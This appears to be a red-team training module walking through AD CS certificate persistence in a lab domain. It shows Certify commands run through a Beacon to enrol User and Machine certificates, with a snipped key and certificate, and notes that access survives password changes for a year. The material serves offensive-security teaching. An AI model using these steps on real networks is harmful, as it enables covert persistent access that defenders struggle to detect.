As we saw in the Active Directory Certificate Services module, certificates can be leveraged for privilege escalation.  They can also be useful for maintaining persistent access to both users and computers.  This is especially viable if managerial approval is not required for certificate requests.

### User Persistence

In this example, I have a Beacon running as **DEV\nlamb**.  Use Certify to find all the certificates that permit client authentication:

```
beacon> getuid
[*] You are DEV\nlamb

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /clientauth
```

  

This will show _every_ certificate template in both CA-1 and CA-2 that has a suitable [EKU](https://www.pkisolutions.com/object-identifiers-oid-in-pki/) (Extended Key Usage) for client authentication, so we need to search the output for a template that matches our requirements.  To limit the volume of output, we can only return templates from the CA in our current domain, using `/ca:dc-2.dev.cyberbotic.io\ca-2`.

It is possible that CA-1 could have templates that we could enrol with, so if nothing was found on CA-2 make sure to check other CAs as well.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/adcs/user-cert-template.png)

  

This is the default `User` template provided by Microsoft.  The important aspects are:

-   The validity period is 1 year.
-   Authorization is not required.
-   Domain Users in DEV have enrollment rights.

  

Request a certificate from this template using `Certify.exe request`:

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User

[*] Action: Request a Certificates
[*] Current user context    : DEV\nlamb
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=Nina Lamb, CN=Users, DC=dev, DC=cyberbotic, DC=io

[*] Certificate Authority   : dc-2.dev.cyberbotic.io\ca-2

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 3

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAo5ejiiRTGXwUsgp5ym3xDOM1ywyb66gnCgBQgNH+vKGHVvRv
[...snip...]
ogA4OuTwSHtQMWDz+22b8Ov1GGKiEWb8xrEWOblXAuanuZVAV6c=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGFzCCBP+gAwIBAgITKQAAAANefI7KgovYwAAAAAAAAzANBgkqhkiG9w0BAQsF
[...snip...]
oY+5b0v0Oa5ofHUC8gSg5BfUlEalH516fAaC
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

  

This certificate allows us to request a TGT for nlamb using Rubeus.  It's valid for 1 year (yes, we can use it to request TGTs for an entire year), and will continue working even if the user changes their password.  It's an excellent user persistence method because it doesn't involve touching LSASS and can be utilised without the need for an elevated context.  The certificate will only become in invalid if it's specifically revoked on the CA.

  
### Computer Persistence

This scenario is not all that different from above.  Machines are a special type of user in AD and can have their own certificates issued.  The default template for computers is called `Machine` (the template display name is `Computer`).  By default they are also valid for 1 year, do not require authorization, and all domain computers have enrollment rights.

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:Machine /machine
```
  

The `/machine` parameter tells Certify to auto-elevate to SYSTEM and assume the identity of the machine account (for which you need to be running in high-integrity).